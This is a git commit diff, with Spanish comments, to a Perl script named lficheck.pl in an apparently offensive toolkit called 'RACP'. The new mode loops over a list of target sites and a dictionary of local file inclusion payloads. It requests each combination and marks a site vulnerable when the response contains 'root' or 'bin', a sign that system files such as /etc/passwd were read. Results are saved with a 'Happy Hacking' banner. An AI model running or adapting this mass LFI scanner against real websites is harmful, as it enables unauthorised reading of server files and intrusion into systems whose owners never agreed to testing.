3e57d6199785b4e731d9ee23d4d74fe07501d965
RodrigoAlonzo <alonzo_5sepro@hotmail.com>
2015-11-22 11:06:54 -0500

    Update lficheck.pl
    Se añadio para que puedas añadir varias targets :P

--- modu/lficheck.pl
+++ modu/lficheck.pl
@@ -4,6 +4,14 @@
 # 9:58 a.m
 use LWP::Simple;
 print "\n";
+print "[A] Default.\n";
+print "[B] Usar diccionario de paginas para verificar LFI. \n";
+$respo = <STDIN>;
+chomp($respo);
+print "\n\n";
+if ( $respo eq 'A' ){  
+
+
 print "[!]Example : www.target.com/php.id= \n\n";
 print "Introduce tu URL \n";
 $patra = <STDIN>;
@@ -38,5 +46,57 @@ else {
 }
 close(LFI);
 }
+} 
+elsif ( $respo eq 'B'){ 
+print "[!] Tu puedes agregar las paginas en el siguiente archivo : \n";
+print "[*] /RACP-master/tak/paginaslfi.txt\n\n";
+sleep(6);
+print "[!] Las paginas vulnerables se guardaran en : \n";
+print "[*] /RACP-master/output/outlfi.txt\n\n";
+sleep(6);
+$outp = 'output/outlfi.txt';
+$targ = 'tak/paginaslfi.txt';
+open ( TARGETS , "<$targ");
+while ( @ob = <TARGETS> ){ 
+	chomp(@ob);
+print "\n\n";
+$lfidicc = 'mhe/dicclfi.txt';
 
+open ( EXPLOIT , "<$lfidicc");
+while (@payload = <EXPLOIT>){
+	chomp(@payload);
+
+
+foreach $tars(@ob){  
+if ($tars !~ /^http:/){
+	$tars = 'http://' . $tars;
+}
+foreach $payasa(@payload){
+
+	$newurl = $tars.$payasa;
+
+	$pagina_codigo = LWP::Simple::get($newurl);
+
+if ( $pagina_codigo =~ /root/ ||
+	 $pagina_codigo =~ /bin/  ){
+	print "[+] Vulnerable -> $newurl\n\n";
+
+open ( SAV , ">>$outp");
+print SAV "\n\n";
+print SAV " RACP | Happy Hacking :D !\n";
+print SAV "===================================\n";
+print SAV "===================================\n\n";
+print SAV "$newurl\n";
+close SAV;
+}
+else {
+	print "[-] No vulnerable -> $newurl\n\n";
+}
+} 
+} 
+close(TARGETS);
+} 
+close(EXPLOIT)
+}
+}
 
